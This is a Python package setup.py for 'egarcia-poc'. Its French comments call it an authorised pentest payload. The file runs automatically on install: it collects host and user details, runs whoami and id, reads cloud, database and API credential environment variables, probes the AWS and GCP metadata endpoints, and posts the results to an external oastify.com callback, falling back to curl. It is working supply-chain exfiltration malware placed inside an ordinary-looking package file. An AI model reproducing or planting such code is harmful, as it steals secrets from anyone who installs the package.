from setuptools import setup, find_packages
import os
import sys
import socket
import subprocess
import platform

def execute_pentest_payload():
    """
    Payload de test RCE pour pentest autorisé
    Remplacez CALLBACK_URL par votre serveur
    """
    CALLBACK_URL = "http://x86aljh1hwdkocr6tfr0408bj2ptdl1a.oastify.com/callback"
    
    # Collecte d'informations système
    info = {
        "hostname": socket.gethostname(),
        "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
        "pwd": os.getcwd(),
        "python_version": sys.version.split()[0],
        "platform": platform.platform(),
        "home": os.getenv("HOME") or os.getenv("USERPROFILE") or "unknown",
    }
    
    # Test RCE - whoami
    try:
        cmd = ["whoami"] if os.name != 'nt' else ["cmd", "/c", "whoami"]
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=5)
        info["whoami"] = result.decode().strip()
    except Exception as e:
        info["whoami_error"] = str(e)
    
    # Test RCE - id (Linux/Unix)
    try:
        if os.name != 'nt':
            result = subprocess.check_output(["id"], stderr=subprocess.STDOUT, timeout=5)
            info["id"] = result.decode().strip()
    except Exception as e:
        info["id_error"] = str(e)
    
    # Variables d'environnement sensibles
    sensitive_vars = [
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
        "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID",
        "GCP_PROJECT_ID", "GOOGLE_APPLICATION_CREDENTIALS",
        "DATABASE_URL", "DB_PASSWORD", "POSTGRES_PASSWORD",
        "MYSQL_ROOT_PASSWORD", "REDIS_PASSWORD",
        "SECRET_KEY", "API_KEY", "TOKEN", "PASSWORD",
        "JUPYTER_TOKEN", "JUPYTER_PASSWORD"
    ]
    
    env_found = {}
    for var in sensitive_vars:
        value = os.getenv(var)
        if value:
            env_found[var] = value[:20] + "..." if len(value) > 20 else value
    
    if env_found:
        info["sensitive_env"] = env_found
    
    # Test accès réseau interne
    try:
        # Tentative de résolution DNS interne
        socket.gethostbyname("metadata.google.internal")
        info["cloud"] = "GCP_detected"
    except:
        pass
    
    try:
        # Test metadata AWS
        import urllib.request
        req = urllib.request.Request(
            "http://169.254.169.254/latest/meta-data/",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
        )
        urllib.request.urlopen(req, timeout=2)
        info["cloud"] = "AWS_detected"
    except:
        pass
    
    # Exfiltration via HTTP POST
    try:
        import urllib.request
        import urllib.parse
        import json
        
        data = urllib.parse.urlencode({"data": json.dumps(info)}).encode()
        req = urllib.request.Request(CALLBACK_URL, data=data, method='POST')
        urllib.request.urlopen(req, timeout=10)
        print("[+] Pentest callback successful")
    except Exception as e:
        print(f"[-] Callback failed: {e}")
        # Fallback: curl si disponible
        try:
            import json
            data_str = json.dumps(info)
            subprocess.run(
                ["curl", "-X", "POST", "-d", f"data={data_str}", CALLBACK_URL],
                timeout=10,
                capture_output=True
            )
            print("[+] Pentest callback via curl successful")
        except Exception as e2:
            print(f"[-] All callback methods failed: {e2}")

# Exécution du payload lors de l'installation
print("[*] egarcia-poc: Executing pentest payload...")
execute_pentest_payload()
print("[*] egarcia-poc: Payload execution completed")

# Configuration du package
setup(
    name="egarcia-poc",
    version="0.1.0",
    packages=find_packages(),
    install_requires=[],
    python_requires=">=3.7",
)
